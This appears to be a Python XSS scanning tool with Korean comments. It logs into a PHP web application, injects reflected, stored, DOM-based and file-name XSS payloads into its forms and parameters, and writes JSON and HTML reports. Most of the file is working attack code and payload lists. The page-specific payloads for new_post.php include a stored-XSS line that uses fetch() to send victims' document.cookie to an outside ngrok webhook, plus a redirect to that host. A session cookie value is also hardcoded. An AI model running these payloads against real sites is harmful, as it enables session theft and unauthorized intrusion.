import requests
import json
from datetime import datetime
from urllib.parse import urljoin, quote
import re
from bs4 import BeautifulSoup
import time

class XSSScanner:
    def __init__(self, target_url, session_cookie=None):
        self.target_url = target_url
        self.session = requests.Session()
        if session_cookie:
            self.session.cookies.set('PHPSESSID', session_cookie)

        # XSS 페이로드 리스트
        self.payloads = {
            'basic': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "';alert(1);//",
            ],
            'advanced': [
                '<img src=x onerror="javascript:alert(1)">',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<input onfocus=alert(1)>',
                '<select onfocus=alert(1)>',
                '<textarea onfocus=alert(1)>',
                '<keygen onfocus=alert(1)>',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror=alert(1)>',
                '<details open ontoggle=alert(1)>',
            ],
            'encoding_bypass': [
                '&#60;script&#62;alert(1)&#60;/script&#62;',
                '\u003cscript\u003ealert(1)\u003c/script\u003e',
                '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            ],
            'filter_bypass': [
                '<ScRiPt>alert(1)</ScRiPt>',
                '<script>alert`1`</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
            ]
        }

        self.vulnerable_inputs = []
        self.test_results = []

    def scan_page(self, page_url):
        """특정 페이지의 입력 필드를 찾아 XSS 테스트"""
        try:
            response = self.session.get(page_url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # 폼 찾기
            forms = soup.find_all('form')
            for form in forms:
                self.test_form(page_url, form)

            # URL 파라미터 테스트
            self.test_url_params(page_url)

        except Exception as e:
            print(f"Error scanning {page_url}: {str(e)}")

    def test_form(self, page_url, form):
        """폼의 각 입력 필드에 XSS 페이로드 테스트"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        form_url = urljoin(page_url, action)

        # 입력 필드 찾기
        inputs = form.find_all(['input', 'textarea', 'select'])

        for input_field in inputs:
            input_name = input_field.get('name')
            input_type = input_field.get('type', 'text')

            if not input_name or input_type in ['submit', 'button']:
                continue

            # 각 페이로드로 테스트
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    self.test_input(form_url, method, input_name, payload, category)

    def test_input(self, url, method, param_name, payload, category):
        """특정 입력 필드에 페이로드 주입 테스트"""
        test_data = {param_name: payload}

        try:
            if method == 'post':
                response = self.session.post(url, data=test_data)
            else:
                response = self.session.get(url, params=test_data)

            # XSS 취약점 확인
            if self.check_vulnerability(response.text, payload):
                vulnerability = {
                    'url': url,
                    'method': method,
                    'parameter': param_name,
                    'payload': payload,
                    'category': category,
                    'timestamp': datetime.now().isoformat()
                }
                self.vulnerable_inputs.append(vulnerability)
                print(f"[VULNERABLE] {url} - {param_name} - {category}")

            # 결과 저장
            self.test_results.append({
                'url': url,
                'method': method,
                'parameter': param_name,
                'payload': payload,
                'category': category,
                'vulnerable': self.check_vulnerability(response.text, payload),
                'response_code': response.status_code,
                'timestamp': datetime.now().isoformat()
            })

        except Exception as e:
            print(f"Error testing {url} with {payload}: {str(e)}")

    def test_url_params(self, url):
        """URL 파라미터를 통한 Reflected XSS 테스트"""
        # URL에 test 파라미터 추가
        test_params = ['name', 'q', 'search', 'id', 'page', 'msg']

        for param in test_params:
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    test_url = f"{url}?{param}={quote(payload)}"
                    try:
                        response = self.session.get(test_url)
                        if self.check_vulnerability(response.text, payload):
                            vulnerability = {
                                'url': url,
                                'method': 'GET',
                                'parameter': param,
                                'payload': payload,
                                'category': category,
                                'type': 'reflected',
                                'timestamp': datetime.now().isoformat()
                            }
                            self.vulnerable_inputs.append(vulnerability)
                            print(f"[VULNERABLE - Reflected] {url} - {param}")
                    except:
                        pass

    def check_vulnerability(self, response_text, payload):
        """응답에서 페이로드가 그대로 반영되었는지 확인"""
        # 기본 체크: 페이로드가 그대로 포함되어 있는지
        if payload in response_text:
            return True
        
        # 인코딩된 형태로 체크
        encoded_checks = [
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            quote(payload),
            payload.replace('"', '&quot;').replace("'", '&#39;')
        ]

        for check in encoded_checks:
            if check in response_text:
                # 부분적으로 인코딩되었지만 여전히 취약할 수 있음
                return self.deep_check(response_text, payload)
            
        return False
    
    def deep_check(self, response_text, payload):
        """더 정밀한 취약점 체크"""
        # HTML 파싱을 통해 스크립트가 실행 가능한 컨텍스트인지 확인
        soup = BeautifulSoup(response_text, 'html.parser')

        # 스크립트 태그 확인
        scripts = soup.find_all('script')
        for script in scripts:
            if payload in str(script):
                return True
            
        # 이벤트 핸들러 확인
        event_pattern = r'on\w+\s*=\s*["\'].*' + re.escape(payload) + r'.*["\']'
        if re.search(event_pattern, response_text, re.IGNORECASE):
            return True
        
        return False
    
    def scan_all_pages(self):
        """모든 페이지 스캔"""
        pages = [
            'login.php',
            'index.php',
            'upload.php',
            'profile.php',
            'new_post.php',
            'file.php'
        ]

        for page in pages:
            page_url = urljoin(self.target_url, page)
            print(f"\n[*] Scanning {page_url}...")
            self.scan_page(page_url)
            time.sleep(1) # Rate limiting

    def generate_report(self, output_file='xss_report.json'):
        """테스트 결과 리포트 생성"""
        report = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_tests': len(self.test_results),
                'vulnerabilities_found': len(self.vulnerable_inputs)
            },
            'vulnerabilities': self.vulnerable_inputs,
            'all_test_results': self.test_results
        }

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        # HTML 리포트 생성
        self.generate_html_report(report)

        print(f"\n[+] Report saved to {output_file}")
        return report
    
    def generate_html_report(self, report_data):
        """HTML 형식의 리포트 생성"""
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Vulnerability Report</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .header {{ background-color: #f0f0f0; padding: 20px; border-radius: 5px; }}
                .vulnerability {{ background-color: #ffe6e6; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 5px solid #ff0000; }}
                .info {{ background-color: #e6f3ff; padding: 10px; margin: 10px 0; border-radius: 5px; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
                .payload {{ font-family: monospace; background-color: #f5f5f5; padding: 2px 4px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>XSS Vulnerability Scan Report</h1>
                <p><strong>Target:</strong> {target_url}</p>
                <p><strong>Scan Date:</strong> {scan_date}</p>
                <p><strong>Total Tests:</strong> {total_tests}</p>
                <p><strong>Vulnerabilities Found:</strong> {vulnerabilities_found}</p>
            </div>
            
            <h2>Vulnerabilities Found</h2>
            {vulnerabilities_section}
            
            <h2>Detailed Test Results</h2>
            <table>
                <tr>
                    <th>URL</th>
                    <th>Method</th>
                    <th>Parameter</th>
                    <th>Payload</th>
                    <th>Category</th>
                    <th>Vulnerable</th>
                </tr>
                {test_results_rows}
            </table>
        </body>
        </html>
        """

        # 취약점 섹션 생성
        vulnerabilities_html = ""
        for vuln in report_data['vulnerabilities']:
            vulnerabilities_html += f"""
            <div class="vulnerability">
                <h3>{vuln['url']} - {vuln['parameter']}</h3>
                <p><strong>Method:</strong> {vuln['method']}</p>
                <p><strong>Payload:</strong> <span class="payload">{vuln['payload']}</span></p>
                <p><strong>Category:</strong> {vuln['category']}</p>
                <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
            </div>
            """

        # 테스트 결과 행 생성
        test_rows = ""
        for result in report_data['all_test_results']:
            vulnerable_class = 'style="background-color: #ffe6e6;"' if result['vulnerable'] else ''
            test_rows += f"""
            <tr {vulnerable_class}>
                <td>{result['url']}</td>
                <td>{result['method']}</td>
                <td>{result['parameter']}</td>
                <td class="payload">{result['payload']}</td>
                <td>{result['category']}</td>
                <td>{'Yes' if result['vulnerable'] else 'No'}</td>
            </tr>
            """

        # HTML 완성
        html_content = html_template.format(
            target_url=report_data['scan_info']['target_url'],
            scan_date=report_data['scan_info']['scan_date'],
            total_tests=report_data['scan_info']['total_tests'],
            vulnerabilities_found=report_data['scan_info']['vulnerabilities_found'],
            vulnerabilities_section=vulnerabilities_html if vulnerabilities_html else '<p class="info">No vulnerabilities found.</p>',
            test_results_rows=test_rows
        )

        with open('xss_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)

# 사용 예시
if __name__ == "__main__":
    # 타겟 URL 설정
    target_url = input("target_url을 입력하세요: ").strip() # 실제 타겟 URL로 변경

    # 세션 쿠키가 필요한 경우 (로그인 후 테스트)
    session_cookie = "br33h4es1vgq2a2k038mmkbl4f" # 실제 세션 쿠키로 변경

    # 스캐너 초기화
    scanner = XSSScanner(target_url, session_cookie)

    # 모든 페이지 스캔
    print("[*] Starting XSS vulnerability scan...")
    scanner.scan_all_pages()

    # 특정 페이지만 스캔하고 싶은 경우
    # scanner.scan_page(urljoin(target_url, 'new_post.php'))

    # 리포트 생성
    report = scanner.generate_report()

    # 결과 요약 출력
    print("\n" + "="*50)
    print("SCAN SUMMARY")
    print("="*50)
    print(f"Total vulnerabilities found: {len(scanner.vulnerable_inputs)}")

    if scanner.vulnerable_inputs:
        print("\nVulnerable endpoints:")
        for vuln in scanner.vulnerable_inputs:
            print(f"  - {vuln['url']} ({vuln['parameter']}) - {vuln['category']}")


# 페이지별 특화 테스트 클래스

class AdvancedXSSScanner(XSSScanner):
    def __init__(self, target_url, session_cookie=None):
        super().__init__(target_url, session_cookie)

        # 페이지별 특화 페이로드
        self.page_specific_payloads = {
            'new_post.php': [
                # 게시글 작성 페이지 - Stored XSS
                '<script>document.cookie</script>',
                '<img src=x onerror="fetch(\'https://irremeable-zoe-scabrous.ngrok-free.dev/webhook?c=\'+document.cookie)">',
                '<svg/onload="location.href=\'https://irremeable-zoe-scabrous.ngrok-free.dev\'">',
            ],
            'profile.php': [
                # 프로필 페이지 - 이메일/이름 필드
                'test@test.com<script>alert(1)</script>',
                'John<img src=x onerror=alert(1)>Doe',
                '"><script>alert(document.domain)</script>',
            ],
            'upload.php': [
                # 파일 업로드 - 파일명 XSS
                'test<script>alert(1)</script>.txt',
                'image"><img src=x onerror=alert(1)>.jpg',
            ],
            'file.php': [
                # 파일 목록 - 파일명 표시 XSS
                '?name=<script>alert(1)</script>',
                '?name=<img src=x onerror=alert(1)>',
            ]
        }

    def test_stored_xss(self, post_url):
        """Stored XSS 테스트 (게시글, 댓글 등)"""
        print(f"\n[*] Testing Stored XSS on {post_url}")

        stored_payloads = [
            {
                'title': 'Test Post <script>alert(1)</script>',
                'content': 'Normal content'
            },
            {
                'title': 'Normal Title',
                'content': '<img src=x onerror="alert(\'Stored XSS\')">'
            },
            {
                'title': 'Test"><script>alert(document.cookie)</script>',
                'content': '<svg onload="alert(1)">'
            }
        ]

        for payload_data in stored_payloads:
            try:
                # 게시글 작성
                response = self.session.post(post_url, data=payload_data)

                # 메인 페이지에서 확인 (게시글이 표시되는 곳)
                time.sleep(1)
                index_response = self.session.get(urljoin(self.target_url, 'index.php'))

                # Stored XSS 확인
                for field, value in payload_data.items():
                    if self.check_vulnerability(index_response.text, value):
                        vulnerability = {
                            'url': post_url,
                            'type': 'Stored XSS',
                            'field': field,
                            'payload': value,
                            'category': 'stored',
                            'severity': 'HIGH',
                            'timestamp': datetime.now().isoformat()
                        }
                        self.vulnerable_inputs.append(vulnerability)
                        print(f"[HIGH RISK - Stored XSS] {field}: {value[:50]}...")

            except Exception as e:
                print(f"Error testing stored XSS: {str(e)}")

    def test_file_upload_xss(self, upload_url):
        """파일 업로드 관련 XSS 테스트"""
        print(f"\n[*] Testing File Upload XSS on {upload_url}")

        # 악성 파일명 테스트
        malicious_filenames = [
            'test<script>alert(1)</script>.txt',
            'image"><img src=x onerror=alert(1)>.jpg',
            'file\';alert(1);//.pdf',
            'document<svg onload=alert(1)>.doc'
        ]

        for filename in malicious_filenames:
            # 더미 파일 생성
            files = {'file': (filename, 'test content', 'text/plain')}

            try:
                response = self.session.post(upload_url, files=files)

                # 파일 목록 페이지 확인
                file_list_response = self.session.get(urljoin(self.target_url, 'file.php'))

                if self.check_vulnerability(file_list_response.text, filename):
                    vulnerability = {
                        'url': upload_url,
                        'type': 'File Upload XSS',
                        'payload': filename,
                        'category': 'file_upload',
                        'severity': 'MEDIUM',
                        'timestamp': datetime.now().isoformat()
                    }
                    self.vulnerable_inputs.append(vulnerability)
                    print(f"[VULNERABLE - File Upload] {filename}")

            except Exception as e:
                print(f"Error testing file upload: {str(e)}")

    def test_dom_xss(self, page_url):
        """DOM-based XSS 테스트"""
        print(f"\n[*] Testing DOM-based XSS on {page_url}")

        dom_payloads = [
            '#<img src=x onerror=alert(1)>',
            '#"><script>alert(1)</script>',
            'javascript:alert(1)',
            '#\'-alert(1)-\'',
            '#onclick=alert(1)//'
        ]

        for payload in dom_payloads:
            test_url = page_url + payload
            try:
                response = self.session.get(test_url)

                # JavaScript 코드에서 취약점 패턴 찾기
                js_patterns = [
                    r'location\.hash',
                    r'document\.write\(',
                    r'innerHTML\s*=',
                    r'eval\(',
                    r'setTimeout\(',
                    r'setInterval\('
                ]

                for pattern in js_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        # DOM 조작 코드가 있고 입력값이 반영되는지 확인
                        if payload in response.text or quote(payload) in response.text:
                            vulnerability = {
                                'url': test_url,
                                'type': 'DOM-based XSS',
                                'payload': payload,
                                'pattern': pattern,
                                'category': 'dom_based',
                                'severity': 'MEDIUM',
                                'timestamp': datetime.now().isoformat()
                            }
                            self.vulnerable_inputs.append(vulnerability)
                            print(f"[POTENTIAL DOM XSS] {page_url} - Pattern: {pattern}")
                            break

            except Exception as e:
                print(f"Error testing DOM XSS: {str(e)}")

    def enhanced_scan(self):
        """향상된 스캔 - 페이지별 특화 테스트 포함"""
        # 기본 스캔
        self.scan_all_pages()

        # Stored XSS 테스트
        self.test_stored_xss(urljoin(self.target_url, 'new_post.php'))

        # 파일 업로드 XSS 테스트
        self.test_file_upload_xss(urljoin(self.target_url, 'upload.php'))

        # DOM-based XSS 테스트
        for page in ['index.php', 'profile.php', 'file.php']:
            self.test_dom_xss(urljoin(self.target_url, page))


# 자동 로그인 및 세션 관리
class XSSAutomation:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()

    def auto_login(self, username, password):
        """자동 로그인"""
        login_url = urljoin(self.target_url, 'login.php')
        login_data = {
            'username': username,
            'password': password
        }

        try:
            response = self.session.post(login_url, data=login_data)
            if 'index.php' in response.text or 'logout' in response.text:
                print("[+] Login successful")
                return self.session.cookies.get('PHPSESSID')
            else:
                print("[-] Login failed")
                return None
        except Exception as e:
            print(f"[-] Login error: {str(e)}")
            return None
        
    def run_full_scan(self, username, password):
        """전체 자동화 스캔 실행"""
        # 1. 로그인
        session_cookie = self.auto_login(username, password)
        if not session_cookie:
            print("[-] Cannot proceed without login")
            return
        
        # 2. 스캐너 초기화
        scanner = AdvancedXSSScanner(self.target_url, session_cookie)

        # 3. 향상된 스캔 실행
        print("\n[*] Starting comprehensive XSS scan...")
        scanner.enhanced_scan()

        # 4. 리포트 생성
        report = scanner.generate_report('xss_vulnerability_report.json')

        # 5. 취약점 요약
        self.print_summary(scanner.vulnerable_inputs)

        return report
    
    def print_summary(self, vulnerabilities):
        """취약점 요약 출력"""
        print("\n" + "="*60)
        print("XSS VULNERABILITY SUMMARY")
        print("="*60)

        if not vulnerabilities:
            print("No vulnerabilities found!")
            return
        
        # 심각도별 분류
        by_severity = {'HIGH': [], 'MEDIUM': [], 'LOW': []}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'MEDIUM')
            by_severity[severity].append(vuln)

        for severity in ['HIGH', 'MEDIUM', 'LOW']:
            if by_severity[severity]:
                print(f"\n{severity} Risk Vulnerabilities ({len(by_severity[severity])}):")
                for vuln in by_severity[severity]:
                    print(f"  - {vuln['url']} ({vuln.get('type', 'XSS')})")
                    print(f"    Parameter: {vuln.get('parameter', vuln.get('field', 'N/A'))}")
                    print(f"    Payload: {vuln['payload'][:50]}...")

# 실행 예시
if __name__ == "__main__":
    # 설정
    TARGET_URL = input("Target URL을 입력하세요. (예: http://localhost/vulnerable_site/) : ").strip()
    USERNAME = input("Username을 입력하세요: ").strip()
    PASSWORD = input("Password를 입력하세요: ").strip()

    # URL이 슬래시로 끝나지 않으면 추가
    if not TARGET_URL.endswith('/'):
        TARGET_URL += '/'

    # 입력값 확인
    print(f"\n[설정된 값]")
    print(f"Target URL: {TARGET_URL}")
    print(f"Username: {USERNAME}")
    print(f"Password: {PASSWORD}")
    print()

    # 자동화 실행
    automation = XSSAutomation(TARGET_URL)
    report = automation.run_full_scan(USERNAME, PASSWORD)